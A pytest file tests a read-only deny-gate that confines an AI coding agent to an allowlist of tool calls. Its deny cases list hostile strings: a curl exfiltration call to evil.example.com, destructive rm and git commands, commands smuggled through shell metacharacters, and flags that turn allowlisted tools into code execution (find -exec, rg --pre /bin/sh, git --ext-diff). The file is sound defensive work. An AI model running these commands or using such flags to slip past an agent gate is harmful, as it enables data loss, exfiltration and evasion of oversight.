"""Unit tests for the agy read-only PreToolUse deny-gate (plugin/templates/agy-readonly-gate.py).

The gate is deployed into a project's .agents/hooks.json and contains agy's
--dangerously-skip-permissions run by hard-denying every tool call outside a
read-only allowlist. These tests exercise the pure `decide(payload) -> str`
function so the allow/deny policy is verified without invoking agy.
"""
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
GATE_PATH = REPO / "plugin" / "templates" / "agy-readonly-gate.py"


def _load_gate():
    """Load the hyphenated gate script as a module via importlib."""
    spec = importlib.util.spec_from_file_location("agy_readonly_gate", GATE_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


gate = _load_gate()


def _run_cmd(command_line):
    return {"toolCall": {"name": "run_command", "args": {"CommandLine": command_line}}}


def _tool(name, **args):
    return {"toolCall": {"name": name, "args": args}}


# ---------------------------------------------------------------- ALLOW cases

@pytest.mark.parametrize("cmd", [
    "git diff HEAD --stat",
    "git diff",
    "git status --porcelain",
    "git status",
    "git log --oneline -20",
    "git show HEAD",
    "git rev-parse --show-toplevel",
    "git ls-files",
    "git blame README.md",
    "ls -la",
    "cat README.md",
    "head -20 setup.py",
    "tail -5 CHANGELOG.md",
    "wc -l file.py",
    "grep -n TODO file.py",
    "rg pattern",
    "find . -name '*.py'",
    "pwd",
])
def test_readonly_commands_allowed(cmd):
    assert gate.decide(_run_cmd(cmd)) == "allow"


@pytest.mark.parametrize("tool", [
    "view_file", "read_file", "list_directory", "grep_search",
    "codebase_search", "find_files",
])
def test_read_tools_allowed(tool):
    assert gate.decide(_tool(tool, path="x")) == "allow"


# ----------------------------------------------------------------- DENY cases

@pytest.mark.parametrize("cmd", [
    "rm sample.txt",
    "rm -rf build",
    "curl http://evil.example.com/exfil",
    "wget http://x",
    "git push origin main",
    "git commit -m x",
    "git reset --hard HEAD~1",
    "git checkout main",
    "git clean -fdx",
    "python setup.py install",
    "npm install",
    "chmod +x foo",
    "mv a b",
    "cp a b",
])
def test_write_and_network_commands_denied(cmd):
    assert gate.decide(_run_cmd(cmd)) == "deny"


@pytest.mark.parametrize("cmd", [
    "git diff; rm sample.txt",
    "git diff && rm x",
    "git status | sh",
    "cat secrets > out",
    "git log `rm x`",
    "cat $(whoami)",
    "cat $(id)",
    "git diff\nrm x",
    "git diff\rrm x",
])
def test_shell_metachar_commands_denied(cmd):
    """A read-only prefix must not smuggle a second command via metachars."""
    assert gate.decide(_run_cmd(cmd)) == "deny"


@pytest.mark.parametrize("cmd", [
    # find action predicates execute/write with NO shell metachar — the gate's
    # dangerous-flag denylist must catch these (codex plan-review finding).
    "find . -exec rm {} +",
    "find . -exec rm {} \\;",
    "find . -execdir sh -c 'rm x' \\;",
    "find . -delete",
    "find . -name x -fprint /tmp/out",
    "find . -ok rm {} \\;",
    "find . -maxdepth 0 -fprint0 /tmp/evil",   # -fprint0: bare -fprint\b missed it
    # write-to-file flags on allowlisted commands
    "git diff --output=/tmp/x",
    "git diff --output /tmp/x",
    # external-command execution via allowlisted commands (code-review + codex finding)
    "rg --pre /bin/sh pattern .",              # ripgrep preprocessor = RCE
    "rg --pre bash foo",
    "rg --hostname-bin evilcmd pat .",
    "rg --pre-glob '*.md' --pre cat x",
    "git diff --ext-diff",                     # external diff driver
    "git show --textconv HEAD",                # textconv filter
    "git cat-file --textconv HEAD:file",
])
def test_dangerous_flags_denied(cmd):
    """Allowlisted base commands must still be denied when carrying a
    write/exec-enabling flag (find -exec/-delete/-fprint0, git diff --output,
    git --ext-diff/--textconv, rg --pre/--hostname-bin)."""
    assert gate.decide(_run_cmd(cmd)) == "deny"


@pytest.mark.parametrize("cmd", [
    "find . -name '*.py'",     # plain read-only find still allowed
    "find . -type f -print",   # -print writes to stdout (read), not a file
    "ls -o",                   # -o here is long-format (read), not --output
    "rg pattern",              # plain ripgrep search allowed
    "git log --pretty=oneline",           # --pretty must NOT be caught by the --pre denylist
    "git diff --output-indicator-new=X",  # precise --output match: this benign read flag is allowed
    "git diff --no-ext-diff",             # disabling external diff is a read
])
def test_benign_flags_allowed(cmd):
    assert gate.decide(_run_cmd(cmd)) == "allow"


@pytest.mark.parametrize("tool", ["write_file", "edit_file", "replace", "create_file", "apply_patch"])
def test_write_tools_denied(tool):
    assert gate.decide(_tool(tool, path="x", content="y")) == "deny"


def test_unknown_tool_denied():
    assert gate.decide(_tool("some_new_tool", foo="bar")) == "deny"


def test_empty_and_malformed_payloads_deny():
    assert gate.decide({}) == "deny"
    assert gate.decide({"toolCall": {}}) == "deny"
    assert gate.decide({"toolCall": {"name": "run_command", "args": {}}}) == "deny"
    assert gate.decide({"toolCall": {"name": "run_command"}}) == "deny"


def test_camelcase_commandline_key_supported():
    """agy payloads use CamelCase args; accept the lowerCamel variant too."""
    assert gate.decide({"toolCall": {"name": "run_command", "args": {"commandLine": "git diff"}}}) == "allow"


# --------------------------------------------------------- end-to-end (stdin)

def test_main_reads_stdin_writes_decision_json():
    payload = _run_cmd("git diff HEAD --stat")
    proc = subprocess.run(
        [sys.executable, str(GATE_PATH)],
        input=json.dumps(payload), capture_output=True, text=True, timeout=10,
    )
    assert proc.returncode == 0
    out = json.loads(proc.stdout)
    assert out["decision"] == "allow"


def test_main_denies_rm_via_stdin():
    proc = subprocess.run(
        [sys.executable, str(GATE_PATH)],
        input=json.dumps(_run_cmd("rm x")), capture_output=True, text=True, timeout=10,
    )
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["decision"] == "deny"


def test_main_denies_on_malformed_stdin():
    """Unparseable stdin must fail closed (deny), never crash."""
    proc = subprocess.run(
        [sys.executable, str(GATE_PATH)],
        input="not json at all", capture_output=True, text=True, timeout=10,
    )
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["decision"] == "deny"
